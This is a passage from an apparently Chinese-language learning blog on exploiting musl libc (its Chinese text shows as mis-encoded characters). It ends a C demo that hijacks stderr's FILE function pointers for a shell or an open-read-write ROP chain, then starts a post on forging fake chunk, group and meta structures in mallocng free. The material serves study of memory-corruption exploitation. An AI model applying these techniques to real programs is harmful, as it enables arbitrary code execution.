22.04ï¼Œmuslç‰ˆæœ¬ï¼š1.2.2ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä¸glibcç›¸ä¼¼ï¼ŒFSOPä¹Ÿæ˜¯muslçš„ä¸€ç§é‡è¦çš„åˆ©ç”¨æ–¹å¼ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä¸‹é¢æ˜¯musl libcä¸­FILEç»“æ„ä½“çš„å®šä¹‰ï¼š\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/internal/stdio_impl.h, line 21)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned flags;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *rpos, *rend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mint (*close)(FILE *);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wend, *wpos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *mustbezero_1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wbase;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*read)(FILE *, unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*write)(FILE *, const unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31moff_t (*seek)(FILE *, off_t, int);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tsize_t buf_size;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev, *next;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint fd;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint pipe_pid;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tlong lockcount;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint mode;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvolatile int lock;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint lbf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *cookie;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t off;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tchar *getln_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *mustbezero_2;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *shend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t shlim, shcnt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev_locked, *next_locked;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct __locale_struct *locale;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ç”¨çº¢è‰²æ ‡å‡ºçš„4è¡Œè¡¨ç¤º4ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¿™æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„å…³é”®ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;åˆæ³¨æ„åˆ°exitå‡½æ•°æœ‰è°ƒç”¨é“¾ï¼šexit-&gt;__stdio_exit-&gt;close_fileã€‚\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 16)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void __stdio_exit(void)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdin_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdout_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stderr_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 8)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static void close_file(FILE *f)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (!f) return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFFINALLOCK(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;å¯ä»¥çœ‹åˆ°3ä¸ªæ ‡å‡†IOçš„FILEç»“æ„ä½“éƒ½å¯èƒ½ä¼šè°ƒç”¨writeå’Œseekå‡½æ•°ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;å¦‚æœèƒ½å¤Ÿä¿®æ”¹è¿™äº›å‡½æ•°æŒ‡é’ˆçš„å€¼ï¼Œå°±èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;å› æ­¤æ— è®ºå¦‚ä½•ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯è·å–libcçš„åŸºåœ°å€ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æˆ‘ä»¬å°±åˆ©ç”¨stderræ ‡å‡†é”™è¯¯FILEç»“æ„ä½“çš„åœ°å€æ¥è·å–ã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = (<span class="type">size_t</span>)<span class="built_in">stderr</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderrçš„åœ°å€ä¸ºï¼š&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, stderr_addr);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderråœ¨libcä¸­çš„åç§»é‡ä¸º0xAD080ã€‚\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = stderr_addr - <span class="number">0xAD080</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;è®¡ç®—å¾—åˆ°libcçš„åŸºåœ°å€ä¸ºï¼š&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\n\033[0m&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == get_shell)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;ä½ é€‰æ‹©äº†get shellæ¨¡å¼ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;åœ¨get shellæ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹stderrçš„3å¤„å†…å®¹ï¼š\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. å¼€å¤´ï¼Œéœ€ä¿®æ”¹ä¸ºå­—ç¬¦ä¸²\&quot;/bin/sh\&quot;ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wposæˆ–wbaseï¼Œä½¿å¾—è¿™ä¸¤ä¸ªå€¼ä¸ç­‰å³å¯ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. writeå‡½æ•°æŒ‡é’ˆï¼Œä¿®æ”¹ä¸ºsystemçš„åœ°å€ã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;éœ€è¦æ³¨æ„è°ƒç”¨writeå‡½æ•°æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯FILEç»“æ„ä½“åœ°å€ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;å› æ­¤éœ€è¦åœ¨FILEå¼€å¤´å†™å­—ç¬¦ä¸²ï¼Œä»è€Œget shellã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;systemçš„åœ°å€ä¸ºï¼š&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">strcpy</span>((<span class="type">char</span>*)stderr_addr, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))system_addr;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;è°ƒæ•™å®Œæˆçš„stderrï¼š\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;æœ€ååªéœ€è¦è°ƒç”¨exitå‡½æ•°å³å¯ã€‚\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == orw)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;ä½ é€‰æ‹©äº†orwæ¨¡å¼ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;orwçš„åˆ©ç”¨æ–¹å¼è¾ƒget shellè¦å¤æ‚ä¸€äº›ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä½†å¯¹äºstderrè€Œè¨€è¿˜æ˜¯åªéœ€è¦ä¿®æ”¹3ä¸ªåœ°æ–¹ï¼š\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. åç§»0x30å¤„ï¼Œä¿®æ”¹ä¸ºä¿®æ”¹ä¸ºæ–°æ ˆçš„åœ°å€ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wbaseï¼Œåç§»0x38ï¼Œä¿®æ”¹ä¸ºç¬¬ä¸€ä¸ªgadgetçš„åœ°å€ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. writeå‡½æ•°æŒ‡é’ˆï¼Œä¿®æ”¹ä¸ºæ ˆè¿ç§»çš„gadgetçš„åœ°å€ã€‚\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;åœ¨åç§»0x789F5å¤„æœ‰è¿™æ ·ä¸€ä¸ªgadgetï¼š\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;è€ƒè™‘åˆ°writeå‡½æ•°è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºstderråœ°å€ï¼Œrdi=stderråœ°å€ã€‚\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;æŒ‰ç…§ä¸Šé¢çš„æ–¹æ¡ˆä¿®æ”¹stderrï¼Œå¯ä»¥å®Œç¾å®ç°æ ˆè¿ç§»ã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;å‡†å¤‡ä¼ªé€ æ ˆçš„åœ°å€ä¸ºï¼š&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> pivot_gadget = libc_base + <span class="number">0x789F5</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdi = libc_base + <span class="number">0x152A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rsi = libc_base + <span class="number">0x1B0A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdx = libc_base + <span class="number">0x2A50B</span>;</span><br><span class="line"></span><br><span class="line">        ((FILE*)stderr_addr)-&gt;mustbezero_1 = (<span class="type">unsigned</span> <span class="type">char</span>*)fake_stack;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)pop_rdi;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))pivot_gadget;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;è°ƒæ•™å®Œæˆçš„stderrï¼š\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä¸€äº›æœ‰ç”¨çš„gadgetï¼š\n&quot;</span>);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rsi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rsi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdx ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdx);</span><br><span class="line"></span><br><span class="line">        fake_stack[<span class="number">0</span>] = (<span class="type">size_t</span>)flag;   <span class="comment">// openå‡½æ•°å‚æ•°1</span></span><br><span class="line">        fake_stack[<span class="number">1</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// openå‡½æ•°å‚æ•°2</span></span><br><span class="line">        fake_stack[<span class="number">3</span>] = (<span class="type">size_t</span>)open;   <span class="comment">// è°ƒç”¨open</span></span><br><span class="line">        fake_stack[<span class="number">4</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">5</span>] = <span class="number">3</span>;              <span class="comment">// readå‡½æ•°å‚æ•°1</span></span><br><span class="line">        fake_stack[<span class="number">6</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">7</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// readå‡½æ•°å‚æ•°2</span></span><br><span class="line">        fake_stack[<span class="number">8</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">9</span>] = <span class="number">0x20</span>;           <span class="comment">// readå‡½æ•°å‚æ•°3</span></span><br><span class="line">        fake_stack[<span class="number">10</span>] = (<span class="type">size_t</span>)read;  <span class="comment">// è°ƒç”¨open</span></span><br><span class="line">        fake_stack[<span class="number">11</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">12</span>] = <span class="number">1</span>;             <span class="comment">// writeå‡½æ•°å‚æ•°1</span></span><br><span class="line">        fake_stack[<span class="number">13</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">14</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// writeå‡½æ•°å‚æ•°2</span></span><br><span class="line">        fake_stack[<span class="number">15</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">16</span>] = <span class="number">0x20</span>;          <span class="comment">// writeå‡½æ•°å‚æ•°3</span></span><br><span class="line">        fake_stack[<span class="number">17</span>] = (<span class="type">size_t</span>)write; <span class="comment">// è°ƒç”¨write</span></span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ–°æ ˆå†…å®¹ï¼š\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)fake_stack, <span class="number">20</span> * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;æœ€ååªéœ€è¦è°ƒç”¨exitå‡½æ•°å³å¯ã€‚\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ï¼Œåœ¨musl libcä¸­FSOPçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªæ˜¯æ¼”ç¤ºäº†å…¶ä¸­ä¸€ç§ã€‚æ›´å¤šçš„åˆ©ç”¨æ–¹å¼è¿˜æ˜¯éœ€è¦é€šè¿‡å¤šçœ‹å¤šåšæ¥æŒæ¡ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">musl pwn å…¥é—¨ (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:40:46" itemprop="dateCreated datePublished" datetime="2023-02-28T22:40:46+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å­¦ä¹ äº†musl libcä¸­å†…å­˜åˆ†é…çš„ç›¸å…³çŸ¥è¯†ï¼Œäº†è§£äº†é‡è¦çš„æ•°æ®ç»“æ„åŠå‡½æ•°å†…å®¹ã€‚æœ¬æ–‡å°†åœ¨æ­¤åŸºç¡€ä¸Šè¿›ä¸€æ­¥åˆ†æmusl pwnçš„åˆ©ç”¨æ–¹å¼ã€‚</p>
<p>musl libcåˆ©ç”¨çš„æ ¸å¿ƒæ€æƒ³æ˜¯å‘freeä¸­ä¼ å…¥ä¸€ä¸ªå‡çš„chunkæŒ‡é’ˆã€‚ç”±äºfreeå‡½æ•°ä¼šé€šè¿‡è¯¥chunkè¿›è¡Œå›æº¯ï¼Œè·å–åˆ°å…¶æ‰€åœ¨çš„<code>group</code>å’Œ<code>meta</code>ï¼Œå› æ­¤é™¤äº†æ„é€ å‡chunkå¤–ï¼Œè¿˜éœ€è¦æ„é€ å‡<code>group</code>å’Œå‡<code>meta</code>ã€‚å¦‚æœåœ¨å‡<code>meta</code>ä¸­åˆç†æ„é€ <code>prev</code>å’Œ<code>next</code>æŒ‡é’ˆï¼Œåœ¨<code>nontrivial_free</code>ä¸­è°ƒç”¨<code>dequeue</code>å‡½æ•°å°±å¯ä»¥å®ç°è¿™ä¸¤ä¸ªåœ°å€äº’ç›¸å†™ã€‚</p>
<p>ä½†åœ¨æ•´ä¸ªæµç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡å¾ˆå¤šæ£€æŸ¥ï¼Œä»¥åŠè¿›å…¥æ­£ç¡®çš„åˆ†æ”¯ã€‚</p>
<p>åœ¨<code>free</code>ä¸­ä¼šè°ƒç”¨<code>nontrivial_free</code>ï¼Œ<code>free</code>ä¸­è°ƒç”¨çš„<code>get_meta</code>å‡½æ•°ä¸­æœ‰ä¸€äº›æ£€æŸ¥é¡¹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(/src/<span class="built_in">malloc</span>/mallocng/meta.h, line <span class="number">129</span>)</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li>meta-&gt;mem == baseï¼Œå³metaä¸­ä¿å­˜çš„groupæŒ‡é’ˆè¦æ­£ç¡®ã€‚</li>
<li>index &lt;= meta-&gt;last_idxï¼Œå³chunkçš„ç´¢å¼•ä¸èƒ½è¶Šç•Œã€‚</li>
<li>area-&gt;check == ctx.secretï¼Œå³metaæ‰€åœ¨çš„meta_areaçš„æ ¡éªŒå€¼æ­£ç¡®ã€‚</li>
<li>offset &gt;= size_classes[meta-&gt;sizeclass]*index</li>
<li>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)ï¼Œè¿™ä¸¤ä¸ªæ£€æŸ¥offsetå’Œchunkå¤§å°æ˜¯å¦å¯¹åº”ã€‚</li>
<li>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);ï¼Œå³æ£€æŸ¥offsetæ˜¯å¦è¶Šç•Œã€‚</li>
</ol>
<p>å¦‚æœä¼ªé€ çš„<code>meta</code>ä½äºä¸€ä¸ªä¼ªé€ çš„<code>meta_area</code>ä¸­ï¼Œéœ€è¦é¦–å…ˆè·å–æ ¡éªŒå€¼<code>secret</code>å¹¶ä¿å­˜åˆ°<code>meta_area</code>å¼€å¤´ï¼Œå³è¿™ä¸€é¡µæœ€å¼€å§‹çš„åœ°æ–¹ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªå‡½æ•°çš„æ£€æŸ¥ä¹‹åï¼Œ<code>nontrivial_free</code>çš„åˆ†æ”¯è¯­å¥ï¼š</p>
